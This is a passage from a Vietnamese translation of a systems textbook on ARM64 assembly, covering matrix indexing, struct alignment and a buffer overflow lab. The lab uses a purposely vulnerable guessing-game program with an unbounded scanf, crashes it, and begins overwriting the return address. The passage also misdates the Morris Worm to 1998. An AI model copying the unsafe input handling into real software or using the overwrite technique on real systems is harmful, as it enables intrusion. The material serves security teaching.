0x98c &lt;+108&gt;: b.lt  0x944 &lt;sumMatrix+36&gt;  // nếu (j &lt; cols) quay lại &lt;sumMatrix+36&gt;
0x990 &lt;+112&gt;: ldr   w0, [sp, #20]         // w0 = i
0x994 &lt;+116&gt;: add   w0, w0, #0x1          // w0 = i + 1
0x998 &lt;+120&gt;: str   w0, [sp, #20]         // i = i + 1
0x99c &lt;+124&gt;: ldr   w1, [sp, #20]         // w1 = i
0x9a0 &lt;+128&gt;: ldr   w0, [sp, #4]          // w0 = rows
0x9a4 &lt;+132&gt;: cmp   w1, w0                // so sánh i với rows
0x9a8 &lt;+136&gt;: b.lt  0x93c &lt;sumMatrix+28&gt;  // nếu (i &lt; rows) quay lại &lt;sumMatrix+28&gt;
0x9ac &lt;+140&gt;: ldr   w0, [sp, #28]         // w0 = total
0x9b0 &lt;+144&gt;: add   sp, sp, #0x20         // khôi phục stack
0x9b4 &lt;+148&gt;: ret                         // trả về total
</code></pre>
<p>Tương tự như trước, các biến <code>i</code>, <code>j</code> và <code>total</code> lần lượt nằm tại <code>sp + 20</code>, <code>sp + 24</code> và <code>sp + 28</code>.<br />
Các tham số đầu vào <code>matrix</code>, <code>row</code> và <code>cols</code> lần lượt nằm tại <code>sp + 8</code>, <code>sp + 4</code> và <code>sp</code> (đỉnh stack).</p>
<p>Hãy tập trung vào đoạn code xử lý việc truy cập phần tử (<em>i</em>, <em>j</em>) — tức <code>matrix[i][j]</code> — từ địa chỉ 0x944 đến 0x970:</p>
<pre><code>0x944 &lt;+36&gt;:   ldrsw  x0, [sp, #20]          // x0 = signExtend(i)
0x948 &lt;+40&gt;:   lsl    x0, x0, #3             // x0 = i &lt;&lt; 3 (hay i * 8)
0x94c &lt;+44&gt;:   ldr    x1, [sp, #8]           // x1 = matrix
0x950 &lt;+48&gt;:   add    x0, x1, x0             // x0 = matrix + i * 8
0x954 &lt;+52&gt;:   ldr    x1, [x0]               // x1 = matrix[i]
</code></pre>
<p>Năm lệnh trên tính toán <code>matrix[i]</code> hay <code>*(matrix + i)</code>.<br />
Vì <code>matrix[i]</code> chứa một con trỏ, <code>i</code> trước tiên được chuyển thành số nguyên 64-bit.<br />
Sau đó, compiler nhân <code>i</code> với 8 bằng phép dịch trái (<code>lsl</code>), rồi cộng kết quả vào địa chỉ <code>matrix</code> để tính offset chính xác (nhớ rằng con trỏ chiếm 8 byte).<br />
Lệnh tại <code>&lt;sumMatrix+52&gt;</code> dereference địa chỉ vừa tính để lấy giá trị <code>matrix[i]</code>.</p>
<p>Vì <code>matrix</code> là mảng các con trỏ <code>int</code>, phần tử tại <code>matrix[i]</code> bản thân nó là một con trỏ <code>int</code>.<br />
Phần tử thứ <em>j</em> trong <code>matrix[i]</code> nằm tại offset <code>j × 4</code> trong mảng <code>matrix[i]</code>.</p>
<p>Bộ lệnh tiếp theo trích xuất phần tử thứ <em>j</em> trong mảng <code>matrix[i]</code>:</p>
<pre><code>0x958 &lt;+56&gt;:   ldrsw  x0, [sp, #24]     // x0 = signExtend(j)
0x95c &lt;+60&gt;:   lsl    x0, x0, #2        // x0 = j &lt;&lt; 2 (hay j * 4)
0x960 &lt;+64&gt;:   add    x0, x1, x0        // x0 = matrix[i] + j * 4
0x964 &lt;+68&gt;:   ldr    w0, [x0]          // w0 = matrix[i][j]
0x968 &lt;+72&gt;:   ldr    w1, [sp, #28]     // w1 = total
0x96c &lt;+76&gt;:   add    w0, w1, w0        // w0 = total + matrix[i][j]
0x970 &lt;+80&gt;:   str    w0, [sp, #28]     // total = total + matrix[i][j]
</code></pre>
<ul>
<li>Lệnh đầu tiên nạp <code>j</code> vào <code>x0</code> và sign-extend.</li>
<li>Lệnh <code>lsl</code> nhân <code>j</code> với 4 và lưu vào <code>x0</code>.</li>
<li>Lệnh <code>add</code> cộng giá trị này vào địa chỉ <code>matrix[i]</code> để lấy địa chỉ <code>&amp;matrix[i][j]</code>.</li>
<li>Lệnh tại <code>&lt;sumMatrix+68&gt;</code> dereference địa chỉ này để lấy giá trị <code>matrix[i][j]</code> và lưu vào <code>w0</code>.</li>
<li>Cuối cùng, các lệnh từ <code>&lt;sumMatrix+72&gt;</code> đến <code>&lt;sumMatrix+80&gt;</code> sẽ cộng giá trị <code>total</code> với <code>matrix[i][j]</code> và cập nhật biến <code>total</code> bằng tổng vừa tính được.</li>
</ul>
<p><strong>Ví dụ truy cập <code>M2[1][2]</code></strong> (hình minh họa bên dưới):</p>
<p><img src="C9-ARM64/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /></p>
<p>Giả sử <code>M2</code> bắt đầu tại địa chỉ bộ nhớ a~0~.<br />
Compiler trước tiên tính địa chỉ của <code>M2[1]</code> bằng cách nhân 1 với 8 (<code>sizeof(int *)</code>) và cộng vào địa chỉ của <code>M2</code> (a~0~), thu được địa chỉ mới a~8~.<br />
Dereference địa chỉ này sẽ cho ra địa chỉ mà <code>M2[1]</code> trỏ tới, tức a~36~.</p>
<p>Tiếp theo, compiler nhân chỉ số 2 với 4 (<code>sizeof(int)</code>) và cộng kết quả (8) vào a~36~, thu được địa chỉ cuối cùng là a~44~.<br />
Dereference địa chỉ a~44~ này sẽ cho giá trị 5.<br />
Quả thật, phần tử trong [DynamicMatrix6a64repro] tương ứng với <code>M2[1][2]</code> có giá trị là 5.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="99-structs-trong-assembly"><a class="header" href="#99-structs-trong-assembly">9.9. structs trong Assembly</a></h2>
<p>Một <code>struct</code> là một cách khác để tạo ra một tập hợp các kiểu dữ liệu trong C.<br />
Không giống như mảng, <code>struct</code> cho phép nhóm nhiều kiểu dữ liệu khác nhau lại với nhau.<br />
C lưu trữ một <code>struct</code> giống như một mảng một chiều, trong đó các phần tử dữ liệu (các <strong>field</strong>) được lưu trữ liên tiếp nhau trong bộ nhớ.</p>
<p>Hãy cùng xem lại <code>struct studentT</code> từ Chương 1:</p>
<pre><code class="language-c">struct studentT {
    char name[64];
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentT student;
</code></pre>
<p><strong>Hình 1</strong> cho thấy cách <code>student</code> được bố trí trong bộ nhớ. Mỗi a~i~ biểu thị một offset trong bộ nhớ.</p>
<p><img src="C9-ARM64/_images/structArray.png" alt="structArray" /></p>
<p><strong>Hình 1.</strong> Sơ đồ bố trí bộ nhớ của một struct <code>studentT</code>.</p>
<p>Mỗi field được lưu liên tiếp nhau trong bộ nhớ theo đúng thứ tự khai báo.<br />
Trong Hình 1, field <code>age</code> được cấp phát ngay sau field <code>name</code> (tại byte offset a~64~), tiếp theo là <code>grad_yr</code> (byte offset a~68~) và <code>gpa</code> (byte offset a~72~).<br />
Cách tổ chức này cho phép truy cập các field một cách hiệu quả về mặt bộ nhớ.</p>
<p>Để hiểu cách compiler sinh code assembly làm việc với một <code>struct</code>, hãy xem xét hàm <code>initStudent</code>:</p>
<pre><code class="language-c">void initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {
    strncpy(s-&gt;name, nm, 64);
    s-&gt;grad_yr = gr;
    s-&gt;age = ag;
    s-&gt;gpa = g;
}
</code></pre>
<p>Hàm <code>initStudent</code> nhận địa chỉ cơ sở của một <code>struct studentT</code> làm tham số đầu tiên,<br />
và các giá trị mong muốn cho từng field làm các tham số còn lại.<br />
Danh sách dưới đây là code assembly tương ứng của hàm:</p>
<pre><code>Dump of assembler code for function initStudent:
0x7f4 &lt;+0&gt;:  stp  x29, x30, [sp, #-48]!  // sp -= 48; lưu x29, x30 tại sp, sp+4
0x7f8 &lt;+4&gt;:  mov  x29, sp                // x29 = sp (frame pointer = stack pointer)
0x7fc &lt;+8&gt;:  str  x0, [x29, #40]         // lưu s tại x29 + 40
0x800 &lt;+12&gt;: str  x1, [x29, #32]         // lưu nm tại x29 + 32
0x804 &lt;+16&gt;: str  w2, [x29, #28]         // lưu ag tại x29 + 28
0x808 &lt;+20&gt;: str  w3, [x29, #24]         // lưu gr tại x29 + 24
0x80c &lt;+24&gt;: str  s0, [x29, #20]         // lưu g tại x29 + 20
0x810 &lt;+28&gt;: ldr  x0, [x29, #40]         // x0 = s
0x814 &lt;+32&gt;: mov  x2, #0x40              // x2 = 0x40 (64)
0x814 &lt;+36&gt;: ldr  x1, [x29, #32]         // x1 = nm
0x818 &lt;+40&gt;: bl   0x6e0 &lt;strncpy@plt&gt;    // gọi strncpy(s, nm, 64) (s-&gt;name)
0x81c &lt;+44&gt;: ldr  x0, [x29, #40]         // x0 = s
0x820 &lt;+48&gt;: ldr  w1, [x29, #24]         // w1 = gr
0x824 &lt;+52&gt;: str  w1, [x0, #68]          // lưu gr tại (s + 68) (s-&gt;grad_yr)
0x828 &lt;+56&gt;: ldr  x0, [x29, #40]         // x0 = s
0x82c &lt;+60&gt;: ldr  w1, [x29, #28]         // w1 = ag
0x830 &lt;+64&gt;: str  w1, [x0, #64]          // lưu ag tại (s + 64) (s-&gt;age)
0x834 &lt;+68&gt;: ldr  x0, [x29, #40]         // x0 = s
0x838 &lt;+72&gt;: ldr  s0, [x29, #20]         // s0 = g
0x83c &lt;+80&gt;: str  s0, [x0, #72]          // lưu g tại (s + 72) (s-&gt;gpa)
0x844 &lt;+84&gt;: ldp  x29, x30, [sp], #48    // khôi phục x29, x30; sp += 48
0x848 &lt;+88&gt;: ret                         // return (void)
</code></pre>
<p>Việc chú ý đến <strong>byte offset</strong> của từng field là chìa khóa để hiểu đoạn code này.<br />
Dưới đây là một vài điểm cần lưu ý:</p>
<ul>
<li>Lời gọi <code>strncpy</code> nhận ba đối số: địa chỉ cơ sở của field <code>name</code> trong <code>s</code>, địa chỉ của mảng <code>nm</code>, và một <strong>length specifier</strong> (chỉ định độ dài).<br />
Hãy nhớ rằng vì <code>name</code> là field đầu tiên trong <code>struct studentT</code>, nên địa chỉ của <code>s</code> cũng chính là địa chỉ của <code>s→name</code>.</li>
</ul>
<pre><code>0x7fc &lt;+8&gt;:  str  x0, [x29, #40]         // lưu s tại x29 + 40
0x800 &lt;+12&gt;: str  x1, [x29, #32]         // lưu nm tại x29 + 32
0x804 &lt;+16&gt;: str  w2, [x29, #28]         // lưu ag tại x29 + 28
0x808 &lt;+20&gt;: str  w3, [x29, #24]         // lưu gr tại x29 + 24
0x80c &lt;+24&gt;: str  s0, [x29, #20]         // lưu g tại x29 + 20
0x810 &lt;+28&gt;: ldr  x0, [x29, #40]         // x0 = s
0x814 &lt;+32&gt;: mov  x2, #0x40              // x2 = 0x40 (64)
0x814 &lt;+36&gt;: ldr  x1, [x29, #32]         // x1 = nm
0x818 &lt;+40&gt;: bl   0x6e0 &lt;strncpy@plt&gt;    // gọi strncpy(s, nm, 64) (s-&gt;name)
</code></pre>
<ul>
<li>
<p>Đoạn code trên có sử dụng một thanh ghi chưa được đề cập trước đó (<code>s0</code>). Thanh ghi <code>s0</code> là ví dụ về thanh ghi dành riêng cho giá trị <strong>floating point</strong>.</p>
</li>
<li>
<p>Phần tiếp theo (các lệnh <code>&lt;initStudent+44&gt;</code> đến <code>&lt;initStudent+52&gt;</code>) ghi giá trị của tham số <code>gr</code> vào vị trí cách đầu <code>s</code> 68 byte.<br />
Xem lại sơ đồ bố trí bộ nhớ của struct trong Hình 1 cho thấy địa chỉ này tương ứng với <code>s→grad_yr</code>.</p>
</li>
</ul>
<pre><code>0x81c &lt;+44&gt;: ldr  x0, [x29, #40]         // x0 = s
0x820 &lt;+48&gt;: ldr  w1, [x29, #24]         // w1 = gr
0x824 &lt;+52&gt;: str  w1, [x0, #68]          // lưu gr tại (s + 68) (s-&gt;grad_yr)
</code></pre>
<ul>
<li>Phần tiếp theo (các lệnh <code>&lt;initStudent+56&gt;</code> đến <code>&lt;initStudent+64&gt;</code>) sao chép tham số <code>ag</code> vào field <code>s→age</code>, nằm tại offset 64 byte tính từ địa chỉ của <code>s</code>.</li>
</ul>
<pre><code>0x828 &lt;+56&gt;: ldr  x0, [x29, #40]         // x0 = s
0x82c &lt;+60&gt;: ldr  w1, [x29, #28]         // w1 = ag
0x830 &lt;+64&gt;: str  w1, [x0, #64]          // lưu ag tại (s + 64) (s-&gt;age)
</code></pre>
<ul>
<li>Cuối cùng, giá trị tham số <code>g</code> được sao chép vào field <code>s→gpa</code> (byte offset 72).<br />
Lưu ý việc sử dụng thanh ghi <code>s0</code> vì dữ liệu tại vị trí <code>x29 + 20</code> là số thực dấu phẩy động đơn chính xác (<em>single-precision floating point</em>):</li>
</ul>
<pre><code>0x834 &lt;+68&gt;: ldr  x0, [x29, #40]         // x0 = s
0x838 &lt;+72&gt;: ldr  s0, [x29, #20]         // s0 = g
0x83c &lt;+80&gt;: str  s0, [x0, #72]          // lưu g tại (s + 72) (s-&gt;gpa)
</code></pre>
<h3 id="991-data-alignment-và-structs"><a class="header" href="#991-data-alignment-và-structs">9.9.1. Data Alignment và structs</a></h3>
<p>Xem xét khai báo <code>studentT</code> đã được chỉnh sửa như sau:</p>
<pre><code class="language-c">struct studentTM {
    char name[63]; // thay đổi thành 63 thay vì 64
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentTM student2;
</code></pre>
<p>Kích thước của field <code>name</code> được thay đổi thành 63 byte thay vì 64 byte như ban đầu.<br />
Hãy xem điều này ảnh hưởng thế nào đến cách <code>struct</code> được bố trí trong bộ nhớ.<br />
Có thể bạn sẽ hình dung nó như trong <a href="C9-ARM64/structs.html#incorrectLayouta64">Hình 2</a>:</p>
<p><img src="C9-ARM64/_images/struct2wrong.png" alt="struct2wrong" /></p>
<p><strong>Hình 2.</strong> Bố trí bộ nhớ <strong>sai</strong> cho struct <code>studentTM</code> đã cập nhật. Lưu ý rằng field <code>&quot;name&quot;</code> giảm từ 64 xuống 63 byte.</p>
<p>Trong hình minh họa này, field <code>age</code> xuất hiện ngay sau field <code>name</code>. Nhưng điều này là <strong>sai</strong>.<br />
<a href="C9-ARM64/structs.html#correctLayouta64">Hình 3</a> cho thấy bố trí thực tế trong bộ nhớ:</p>
<p><img src="C9-ARM64/_images/struct2right.png" alt="struct2right" /></p>
<p><strong>Hình 3.</strong> Bố trí bộ nhớ <strong>đúng</strong> cho struct <code>studentTM</code> đã cập nhật.<br />
Byte a~63~ được compiler thêm vào để đáp ứng yêu cầu <strong>memory alignment</strong>, nhưng nó không thuộc về bất kỳ field nào.</p>
<p>Chính sách <strong>alignment</strong> của A64 yêu cầu:</p>
<ul>
<li>Các kiểu dữ liệu 4 byte (ví dụ: <code>int</code>) phải nằm ở địa chỉ là bội số của 4.</li>
<li>Các kiểu dữ liệu 64-bit (<code>long</code>, <code>double</code>, và con trỏ) phải nằm ở địa chỉ là bội số của 8.</li>
</ul>
<p>Đối với một <code>struct</code>, compiler sẽ thêm các byte trống gọi là <strong>padding</strong> giữa các field để đảm bảo mỗi field thỏa coden yêu cầu alignment.<br />
Ví dụ, trong <code>struct</code> ở đoạn code trên, compiler thêm 1 byte padding tại byte a~63~ để đảm bảo field <code>age</code> bắt đầu ở địa chỉ là bội số của 4.<br />
Các giá trị được <strong>align</strong> đúng trong bộ nhớ có thể được đọc hoặc ghi chỉ với một thao tác, giúp tăng hiệu suất.</p>
<p>Xem điều gì xảy ra khi <code>struct</code> được định nghĩa như sau:</p>
<pre><code class="language-c">struct studentTM {
    int  age;
    int  grad_yr;
    float gpa;
    char name[63];
};

struct studentTM student3;
</code></pre>
<p>Việc chuyển mảng <code>name</code> xuống cuối struct sẽ dời byte padding xuống cuối struct, đảm bảo <code>age</code>, <code>grad_yr</code> và <code>gpa</code> đều được <strong>align</strong> theo 4 byte.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="910-thực-tế-buffer-overflow"><a class="header" href="#910-thực-tế-buffer-overflow">9.10. Thực tế: Buffer Overflow</a></h2>
<p>Ngôn ngữ C không thực hiện việc kiểm tra giới hạn mảng (<em>array bounds checking</em>) một cách tự động. Việc truy cập bộ nhớ nằm ngoài phạm vi của một mảng là vấn đề nghiêm trọng và thường dẫn đến các lỗi như <strong>segmentation fault</strong>. Tuy nhiên, một kẻ tấn công tinh vi có thể chèn code độc nhằm cố ý vượt quá giới hạn của mảng (còn gọi là <strong>buffer</strong>) để buộc chương trình thực thi theo cách không mong muốn. Trong trường hợp xấu nhất, kẻ tấn công có thể chạy code cho phép chúng giành được <strong>root privilege</strong> (quyền quản trị cao nhất), hoặc quyền truy cập ở cấp hệ điều hành vào hệ thống máy tính.</p>
<p>Một phần mềm khai thác (<em>exploit</em>) lợi dụng sự tồn tại của một lỗi <strong>buffer overrun</strong> đã biết trong chương trình được gọi là <strong>buffer overflow exploit</strong>.</p>
<p>Trong phần này, chúng ta sẽ sử dụng <strong>GDB</strong> và ngôn ngữ assembly để phân tích chi tiết cơ chế của một buffer overflow exploit. Trước khi đọc chương này, bạn nên tham khảo chương nói về <a href="C9-ARM64/../C3-C_debug/gdb_assembly.html#_debugging_assembly_code">GDB để kiểm tra code assembly</a>.</p>
<h3 id="9101-các-ví-dụ-nổi-tiếng-về-buffer-overflow"><a class="header" href="#9101-các-ví-dụ-nổi-tiếng-về-buffer-overflow">9.10.1. Các ví dụ nổi tiếng về Buffer Overflow</a></h3>
<p>Các <strong>buffer overflow exploit</strong> xuất hiện từ những năm 1980 và vẫn là một mối đe dọa lớn đối với ngành công nghiệp máy tính cho đến đầu những năm 2000. Mặc dù nhiều hệ điều hành hiện đại đã có các cơ chế bảo vệ chống lại những cuộc tấn công buffer overflow đơn giản nhất, nhưng các lỗi lập trình bất cẩn vẫn có thể khiến các chương trình hiện đại dễ bị tấn công. Gần đây, các lỗ hổng buffer overflow đã được phát hiện trong Skype¹, Android², Google Chrome³ và nhiều phần mềm khác.</p>
<p>Dưới đây là một số ví dụ lịch sử đáng chú ý về buffer overflow exploit:</p>
<p><strong>The Morris Worm</strong><br />
:   <strong>The Morris Worm</strong>⁴ được phát tán vào năm 1998 trên ARPANet từ MIT (nhằm che giấu việc nó được viết bởi một sinh viên của Cornell) và đã khai thác một lỗ hổng <strong>buffer overrun</strong> tồn tại trong <strong>Unix finger daemon</strong> (<code>fingerd</code>). Trong Linux và các hệ thống tương tự Unix khác, <strong>daemon</strong> là một loại tiến trình chạy liên tục ở chế độ nền, thường thực hiện các tác vụ dọn dẹp hoặc giám sát. Daemon <code>fingerd</code> trả về báo cáo thân thiện về một máy tính hoặc người dùng. Điều quan trọng là con sâu này có cơ chế tự sao chép, khiến nó được gửi nhiều lần đến cùng một máy tính, làm hệ thống chậm đến mức không thể sử dụng. Mặc dù tác giả tuyên bố rằng con sâu chỉ nhằm mục đích nghiên cứu vô hại, nhưng cơ chế tự sao chép đã giúp nó lan truyền dễ dàng và khó bị loại bỏ. Trong những năm sau đó, các loại sâu khác cũng sử dụng buffer overflow exploit để truy cập trái phép vào hệ thống, ví dụ như <strong>Code Red (2001)</strong>, <strong>MS-SQLSlammer (2003)</strong> và <strong>W32/Blaster (2003)</strong>.</p>
<p><strong>AOL Chat Wars</strong><br />
:   David Auerbach⁵, một cựu kỹ sư của Microsoft, đã kể lại trải nghiệm của mình với một lỗi buffer overflow trong quá trình tích hợp <strong>Microsoft Messenger Service (MMS)</strong> với <strong>AOL Instant Messenger (AIM)</strong> vào cuối những năm 1990. Thời điểm đó, AIM là dịch vụ nhắn tin nhanh phổ biến nhất. Microsoft muốn chen chân vào thị trường này bằng cách thiết kế một tính năng trong MMS cho phép người dùng MMS trò chuyện với “buddies” trên AIM. Không hài lòng, AOL đã vá máy chủ của họ để MMS không thể kết nối. Các kỹ sư Microsoft tìm ra cách để MMS giả mạo tin nhắn giống như AIM gửi tới máy chủ AOL, khiến AOL khó phân biệt tin nhắn từ MMS và AIM. AOL đáp trả bằng cách thay đổi định dạng tin nhắn của AIM, và các kỹ sư MMS lại chỉnh sửa để bắt chước định dạng mới. “Cuộc chiến chat” này tiếp diễn cho đến khi AOL bắt đầu sử dụng một lỗi buffer overflow <em>ngay trong client của họ</em> để xác minh tin nhắn đến từ AIM. Vì MMS không có cùng lỗ hổng này, cuộc chiến kết thúc với phần thắng thuộc về AOL.</p>
<h3 id="9102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số-the-guessing-game"><a class="header" href="#9102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số-the-guessing-game">9.10.2. Cái nhìn đầu tiên: Trò chơi đoán số (The Guessing Game)</a></h3>
<p>Để giúp bạn hiểu cơ chế của một cuộc tấn công buffer overflow, chúng tôi cung cấp một chương trình thực thi đơn giản cho phép người dùng chơi trò đoán số với máy tính. Tải file thực thi <code>secret</code> tại <a href="C9-ARM64/_attachments/secretARM64.tar.gz">liên kết này</a> và giải nén bằng lệnh <code>tar</code>:</p>
<pre><code>$ tar -xzvf secretARM64.tar.gz
</code></pre>
<p>Dưới đây là nội dung file <code>main.c</code> (<a href="C9-ARM64/_attachments/main.c">main.c</a>), tệp chính của chương trình thực thi:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot;

int endGame(void){
  printf(&quot;You win!\n&quot;);
  exit(0);
}

int playGame(void){
  int guess, secret, len, x=3;
  char buf[12];
  printf(&quot;Enter secret number:\n&quot;);
  scanf(&quot;%s&quot;, buf);
  guess = atoi(buf);
  secret=getSecretCode();
  if (guess == secret)
    printf(&quot;You got it right!\n&quot;);
  else{
    printf(&quot;You are so wrong!\n&quot;);
    return 1;
  }
  printf(&quot;Enter the secret string to win:\n&quot;);
  scanf(&quot;%s&quot;, buf);
  guess = calculateValue(buf, strlen(buf));
  if (guess != secret){
    printf(&quot;You lose!\n&quot;);
    return 2;
  }
  endGame();
  return 0;
}

int main(void) {
  int res = playGame();
  return res;
}
</code></pre>
<p>Trò chơi này yêu cầu người chơi nhập trước một số bí mật (<em>secret number</em>) và sau đó là một chuỗi bí mật (<em>secret string</em>) để chiến thắng. File header <code>other.h</code> chứa định nghĩa của các hàm <code>getSecretCode</code> và <code>calculateValue</code>, nhưng chúng ta không có file này. Vậy làm thế nào để người chơi thắng? Thử brute force sẽ mất quá nhiều thời gian. Một chiến lược khác là phân tích file thực thi <code>secret</code> bằng GDB và bước qua code assembly để tìm ra số và chuỗi bí mật. Quá trình phân tích code assembly để hiểu cách hoạt động của chương trình được gọi là <strong>reverse engineering</strong>. Những người đã quen với GDB và đọc assembly có thể dùng GDB để reverse engineer số và chuỗi bí mật.</p>
<p>Tuy nhiên, vẫn còn một cách khác, tinh vi hơn, để chiến thắng.</p>
<h3 id="9103-xem-xét-kỹ-hơn-under-the-c"><a class="header" href="#9103-xem-xét-kỹ-hơn-under-the-c">9.10.3. Xem xét kỹ hơn (Under the C)</a></h3>
<p>Chương trình chứa một lỗ hổng <strong>buffer overrun</strong> tiềm ẩn tại lần gọi <code>scanf</code> đầu tiên. Để hiểu chuyện gì đang xảy ra, chúng ta sẽ kiểm tra code assembly của hàm <code>main</code> bằng GDB. Đồng thời, chúng ta sẽ đặt một breakpoint tại địa chỉ <code>0x0000aaaaaaaaa92c</code>, đây là địa chỉ của lệnh ngay trước khi gọi <code>scanf</code> (nếu đặt breakpoint tại địa chỉ của <code>scanf</code> thì chương trình sẽ dừng <em>bên trong</em> lời gọi <code>scanf</code>, chứ không phải trong <code>main</code>). Sau đó, dùng lệnh <code>ni</code> để thực thi từng lệnh một.</p>
<pre><code>Dump of assembler code for function playGame:
    0x0000aaaaaaaaa908 &lt;+0&gt;:   stp x29, x30, [sp, #-48]!
    0x0000aaaaaaaaa90c &lt;+4&gt;:   mov x29, sp
    0x0000aaaaaaaaa910 &lt;+8&gt;:   mov w0, #0x3
    0x0000aaaaaaaaa914 &lt;+12&gt;:  str w0, [x29, #44]
    0x0000aaaaaaaaa918 &lt;+16&gt;:  adrp    x0, 0xaaaaaaaaa000
    0x0000aaaaaaaaa91c &lt;+20&gt;:  add x0, x0, #0xac0
    0x0000aaaaaaaaa920 &lt;+24&gt;:  bl  0xaaaaaaaaa730 &lt;puts@plt&gt;
    0x0000aaaaaaaaa924 &lt;+28&gt;:  add x1, x29, #0x18
    0x0000aaaaaaaaa928 &lt;+32&gt;:  adrp    x0, 0xaaaaaaaaa000
    0x0000aaaaaaaaa92c &lt;+36&gt;:  add x0, x0, #0xad8
=&gt; 0x0000aaaaaaaaa930 &lt;+40&gt;:   bl  0xaaaaaaaaa740 &lt;__isoc99_scanf@plt&gt;
</code></pre>
<h3 id="9104-buffer-overflow-lần-thử-đầu-tiên-first-attempt"><a class="header" href="#9104-buffer-overflow-lần-thử-đầu-tiên-first-attempt">9.10.4. Buffer Overflow: Lần thử đầu tiên (First Attempt)</a></h3>
<p>Tiếp theo, hãy thử nhập chuỗi<br />
<code>12345678901234567890123456789012345</code>:</p>
<pre><code>$ ./secret
Enter secret number:
12345678901234567890123456789012345
You are so wrong!
Bus error
$ echo $?
139
</code></pre>
<p>Thú vị đấy! Lần này chương trình bị crash với lỗi <strong>bus error</strong> (một dạng lỗi bộ nhớ khác), và trả về code thoát (<em>return code</em>) 139. <strong>Hình 3</strong> cho thấy <em>call stack</em> của <code>main</code> ngay sau khi gọi <code>scanf</code> với chuỗi đầu vào mới này.</p>
<p><img src="C9-ARM64/_images/afterScanf2.png" alt="after2" /></p>
<p><strong>Hình 3.</strong> <em>Call stack</em> ngay sau khi gọi <code>scanf</code> với đầu vào <code>12345678901234567890123456789012345</code></p>
<p>Chuỗi nhập này dài đến mức không chỉ ghi đè lên giá trị <code>x29</code> đã lưu tại địa chỉ <code>0xeed8</code>, mà còn tràn xuống ghi đè cả <strong>return address</strong> bên dưới <em>stack frame</em> của <code>main</code>. Hãy nhớ rằng khi một hàm trả về, chương trình sẽ cố gắng tiếp tục thực thi tại địa chỉ được lưu trong <strong>return address</strong>. Trong ví dụ này, sau khi thoát khỏi <code>main</code>, chương trình cố gắng tiếp tục tại địa chỉ <code>0xffff00353433</code>, vốn không tồn tại. Vì vậy, chương trình bị crash với lỗi <strong>bus error</strong>.</p>
<p>Chạy lại chương trình trong GDB (<code>input.txt</code> chứa chuỗi nhập ở trên) sẽ cho thấy rõ điều này:</p>
<pre><code>$ gdb secret
(gdb) break *0x0000aaaaaaaaa934
(gdb) run &lt; input.txt
(gdb) ni
(gdb) x /64bx $sp
0xffffffffeec0: 0xf0    0xee    0xff    0xff    0xff    0xff    0x00    0x00
0xffffffffeec8: 0xf0    0xa9    0xaa    0xaa    0xaa    0xaa    0x00    0x00
0xffffffffeed0: 0x10    0xef    0xff    0xff    0xff    0xff    0x00    0x00
0xffffffffeed8: 0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38
0xffffffffeee0: 0x39    0x30    0x31    0x32    0x33    0x34    0x35    0x36
0xffffffffeee8: 0x37    0x38    0x39    0x30    0x31    0x32    0x33    0x34
0xffffffffeef0: 0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32
0xffffffffeef8: 0x33    0x34    0x35    0x00    0xff    0xff    0x00    0x00
(gdb) n
Single stepping until exit from function playGame,
which has no line number information.
You are so wrong!
0x0000aaaaaaaaa9f0 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x0000ffff00353433 in ?? ()
</code></pre>
<p>Hãy chú ý rằng chuỗi nhập của chúng ta đã vượt quá giới hạn khai báo của mảng <code>buf</code>, ghi đè lên tất cả các giá trị khác được lưu trên stack. Nói cách khác, chuỗi này đã tạo ra một <strong>buffer overrun</strong> và làm hỏng <em>call stack</em>, khiến chương trình bị crash. Quá trình này còn được gọi là <strong>smashing the stack</strong>.</p>
<h3 id="9105-buffer-overflow-tinh-vi-hơn-lần-thử-thứ-hai-a-smarter-buffer-overflow-second-attempt"><a class="header" href="#9105-buffer-overflow-tinh-vi-hơn-lần-thử-thứ-hai-a-smarter-buffer-overflow-second-attempt">9.10.5. Buffer Overflow tinh vi hơn: Lần thử thứ hai (A Smarter Buffer Overflow: Second Attempt)</a></h3>
<p>Ví dụ đầu tiên đã <em>smash the stack</em> bằng cách ghi đè giá trị thanh ghi <code>x29</code> đã lưu và <strong>return address</strong> của <code>main</code> bằng dữ liệu rác, khiến chương trình bị crash. Một kẻ tấn công chỉ muốn làm chương trình sập thì đến đây đã đạt mục tiêu.</p>
<p>Tuy nhiên, mục tiêu của chúng ta là đánh lừa trò chơi đoán số để nó trả về giá trị 0, báo hiệu rằng chúng ta đã thắng. Chúng ta sẽ làm điều này bằng cách ghi đè <em>call stack</em> bằng dữ liệu có ý nghĩa hơn là chỉ rác. Ví dụ, ta có thể ghi đè stack sao cho <strong>return address</strong> được thay bằng địa chỉ của hàm <code>endGame</code>. Khi đó, khi chương trình cố gắng trả về từ <code>main</code>, nó sẽ thực thi <code>endGame</code> thay vì bị crash.</p>
<p>Để tìm địa chỉ của <code>endGame</code>, hãy mở lại <code>secret</code> trong GDB:</p>
<pre><code>$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
    0x0000aaaaaaaaa8ec &lt;+0&gt;:   stp x29, x30, [sp, #-16]!
    0x0000aaaaaaaaa8f0 &lt;+4&gt;:   mov x29, sp
    0x0000aaaaaaaaa8f4 &lt;+8&gt;:   adrp    x0, 0xaaaaaaaaa000
    0x0000aaaaaaaaa8f8 &lt;+12&gt;:  add x0, x0, #0xab0
    0x0000aaaaaaaaa8fc &lt;+16&gt;:  bl  0xaaaaaaaaa730 &lt;puts@plt&gt;
    0x0000aaaaaaaaa900 &lt;+20&gt;:  mov w0, #0x0
    0x0000aaaaaaaaa904 &lt;+24&gt;:  bl  0xaaaaaaaaa6d0 &lt;exit@plt&gt;
</code></pre>
